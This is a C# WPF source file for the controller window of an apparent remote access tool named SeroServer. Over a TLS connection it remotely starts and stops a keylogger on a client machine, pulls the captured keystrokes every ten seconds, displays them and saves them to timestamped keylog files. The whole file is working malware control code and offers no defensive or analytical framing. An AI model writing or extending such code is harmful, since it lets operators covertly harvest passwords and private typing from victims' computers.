using System.IO;
using System.Windows;
using System.Windows.Input;
using System.Windows.Threading;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class KeyloggerWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool               _capturing;
    private readonly DispatcherTimer _autoRefresh = new() { Interval = TimeSpan.FromSeconds(10) };

    public KeyloggerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = $"  —  {clientLabel}";

        _server.RegisterHandler(clientId, PacketType.KeyloggerLogsResult, OnLogsResult);

        _autoRefresh.Tick += (_, _) => { if (_capturing) RequestLogs(); };

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.KeyloggerLogsResult);
            _autoRefresh.Stop();
        };
    }

    // ── Server → client ────────────────────────────────────────────────────

    private async void RequestLogs()
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
    }

    // ── Client → server ────────────────────────────────────────────────────

    private void OnLogsResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerLogsResultData>(pkt.Data);
        if (data == null) return;

        Dispatcher.Invoke(() =>
        {
            _capturing = data.IsRunning;
            UpdateBadge();

            if (!string.IsNullOrEmpty(data.Logs))
            {
                TxtLog.AppendText(data.Logs);
                TxtLog.ScrollToEnd();
                PnlIdle.Visibility = Visibility.Collapsed;
            }

            int chars = TxtLog.Text.Length;
            TxtChars.Text = $"{chars:N0} chars";
            TxtStatus.Text = _capturing
                ? $"Capturing — auto-refresh every 10 s"
                : "Stopped";
        });
    }

    // ── Button handlers ────────────────────────────────────────────────────

    private async void BtnStart_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
        _capturing = true;
        UpdateBadge();
        BtnStart.IsEnabled = false;
        BtnStop.IsEnabled  = true;
        _autoRefresh.Start();
        TxtStatus.Text = "Capturing — logs update every 10 s";
    }

    private async void BtnStop_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStop });
        _capturing = false;
        UpdateBadge();
        BtnStart.IsEnabled = true;
        BtnStop.IsEnabled  = false;
        _autoRefresh.Stop();
        // Get final logs
        RequestLogs();
        TxtStatus.Text = "Stopped";
    }

    private void BtnGet_Click(object s, RoutedEventArgs e)
    {
        RequestLogs();
        TxtStatus.Text = "Requesting logs…";
    }

    private async void BtnClear_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerClear });
        TxtLog.Clear();
        PnlIdle.Visibility = Visibility.Visible;
        TxtChars.Text = "0 chars";
        TxtStatus.Text = "Log cleared";
    }

    private void BtnSave_Click(object s, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(TxtLog.Text)) { TxtStatus.Text = "Nothing to save."; return; }
        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "Text Files (*.txt)|*.txt",
            FileName = $"keylog_{_clientId}_{DateTime.Now:yyyyMMdd_HHmmss}.txt"
        };
        if (dlg.ShowDialog() != true) return;
        File.WriteAllText(dlg.FileName, TxtLog.Text);
        TxtStatus.Text = $"Saved: {dlg.FileName}";
    }

    private void UpdateBadge()
    {
        BadgeRunning.Visibility = _capturing ? Visibility.Visible : Visibility.Collapsed;
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed) DragMove();
    }
    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
